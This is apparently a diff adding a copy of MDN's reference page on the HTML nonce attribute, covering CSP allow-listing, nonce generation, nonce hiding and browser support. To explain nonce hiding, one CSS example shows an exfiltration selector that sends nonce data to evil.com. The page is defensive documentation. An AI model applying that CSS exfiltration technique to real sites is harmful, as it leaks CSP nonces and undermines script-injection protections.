@@ -1,0 +1,87 @@
+<h1>nonce</h1> <p>The <code>nonce</code> <a href="../global_attributes">global attribute</a> is a content attribute defining a cryptographic nonce ("number used once") which can be used by <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy</a> to determine whether or not a given fetch will be allowed to proceed for a given element.</p>
+<h2 id="description">Description</h2>
+<p>The <code>nonce</code> attribute is useful to allow-list specific elements, such as a particular inline script or style elements. It can help you to avoid using the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP</a> <code>unsafe-inline</code> directive, which would allow-list <em>all</em> inline scripts or styles.</p> <div class="note notecard">Note: Only use <code>nonce</code> for cases where you have no way around using unsafe inline script or style contents. If you don't need <code>nonce</code>, don't use it. If your script is static, you could also use a CSP hash instead. (See usage notes on <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script">unsafe inline script</a>.) Always try to take full advantage of <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP</a> protections and avoid nonces or unsafe inline scripts whenever possible.</div>
+<h3 id="using_nonce_to_allow-list_a_script_element">Using nonce to allow-list a &lt;script&gt; element</h3>
+<p>There are a few steps involved to allow-list an inline script using the nonce mechanism:</p> <h4 id="generating_values">Generating values</h4> <p>From your web server, generate a random base64-encoded string of at least 128 bits of data from a cryptographically secure random number generator. Nonces should be generated differently each time the page loads (nonce only once!). For example, in nodejs:</p> <pre data-language="css">const crypto = <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+crypto.<span class="token function">randomBytes</span><span class="token punctuation">(</span>16<span class="token punctuation">)</span>.<span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+// <span class="token string">'8IBTHwOdqNKAWeKl7plt8g=='</span>
+</pre> <h4 id="allow-listing_inline_script">Allow-listing inline script</h4> <p>The nonce generated on your backend code should now be used for the inline script that you'd like to allow-list:</p> <pre data-language="html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8IBTHwOdqNKAWeKl7plt8g==<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">…</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></pre> <h4 id="sending_a_nonce_with_a_csp_header">Sending a nonce with a CSP header</h4> <p>Finally, you'll need to send the nonce value in a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy"><code>Content-Security-Policy</code></a> header (prepend <code>nonce-</code>):</p> <pre data-language="http"><span class="token header-name keyword">Content-Security-Policy:</span> script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='</pre>
+<h3 id="accessing_nonces_and_nonce_hiding">Accessing nonces and nonce hiding</h3>
+<p>For security reasons, the <code>nonce</code> content attribute is hidden (an empty string will be returned).</p> <pre data-language="js">script<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'nonce'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// returns empty string</span></pre> <p>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLOrForeignElement/nonce"><code>nonce</code></a> property is the only way to access nonces:</p> <pre data-language="js">script<span class="token punctuation">.</span>nonce<span class="token punctuation">;</span> <span class="token comment">// returns nonce value</span></pre> <p>Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data from content attributes like this:</p> <pre data-language="css"><span class="token selector">script[nonce~=whatever]</span> <span class="token punctuation">{</span>
+  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"https://evil.com/nonce?whatever"</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></pre>
+<h2 id="specifications">Specifications</h2>
+<div class="_table"><table class="standard-table"> <thead> <tr> <th scope="col">Specification</th> </tr> </thead> <tbody> <tr> <td><a href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce" hreflang="en" rel=" noopener">HTML Living Standard<br><small>The definition of 'nonce' in that specification.</small></a></td> </tr> </tbody> </table></div>
+<h2 id="browser_compatibility">Browser compatibility</h2>
+<table>
+<thead>
+<tr id="bct-browser-type">
+<th></th>
+<th colspan="6">Desktop</th>
+<th colspan="6">Mobile</th>
+</tr>
+<tr id="bct-browsers">
+<th></th>
+<th>Chrome</th>
+<th>Edge</th>
+<th>Firefox</th>
+<th>Internet Explorer</th>
+<th>Opera</th>
+<th>Safari</th>
+<th>WebView Android</th>
+<th>Chrome Android</th>
+<th>Firefox for Android</th>
+<th>Opera Android</th>
+<th>Safari on IOS</th>
+<th>Samsung Internet</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<th><code>nonce</code></th>
+<td class="bc-supports-yes"><div>Yes</div></td>
+<td class="bc-supports-yes"><div>Yes</div></td>
+<td class="bc-supports-yes"><div>31</div></td>
+<td class="bc-supports-no"><div>No</div></td>
+<td class="bc-supports-yes"><div>Yes</div></td>
+<td class="bc-supports-yes"><div>Yes</div></td>
+<td class="bc-supports-yes"><div>Yes</div></td>
+<td class="bc-supports-yes"><div>Yes</div></td>
+<td class="bc-supports-yes"><div>31</div></td>
+<td class="bc-supports-yes"><div>Yes</div></td>
+<td class="bc-supports-yes"><div>Yes</div></td>
+<td class="bc-supports-yes"><div>Yes</div></td>
+</tr>
+<tr>
+<th><code>nonce_hiding</code></th>
+<td class="bc-supports-yes"><div>61</div></td>
+<td class="bc-supports-yes"><div>79</div></td>
+<td class="bc-supports-yes"><div>75</div></td>
+<td class="bc-supports-no"><div>No</div></td>
+<td class="bc-supports-yes"><div>48</div></td>
+<td class="bc-supports-no">
+<div>No</div>
+<div>See <a href="https://webkit.org/b/179728">bug 179728</a>
+</div>
+</td>
+<td class="bc-supports-yes"><div>61</div></td>
+<td class="bc-supports-yes"><div>61</div></td>
+<td class="bc-supports-yes"><div>79</div></td>
+<td class="bc-supports-yes"><div>45</div></td>
+<td class="bc-supports-no">
+<div>No</div>
+<div>See <a href="https://webkit.org/b/179728">bug 179728</a>
+</div>
+</td>
+<td class="bc-supports-yes"><div>8.0</div></td>
+</tr>
+</tbody>
+</table>
+
+
+<h2 id="see_also">See also</h2>
+<ul> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLOrForeignElement/nonce"><code>HTMLOrForeignElement.nonce</code></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy</a></li> <li>CSP: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src"><code>script-src</code></a>
+</li> </ul>
+    <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce" class="_attribution-link">https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce</a>
+  </p>
+</div>
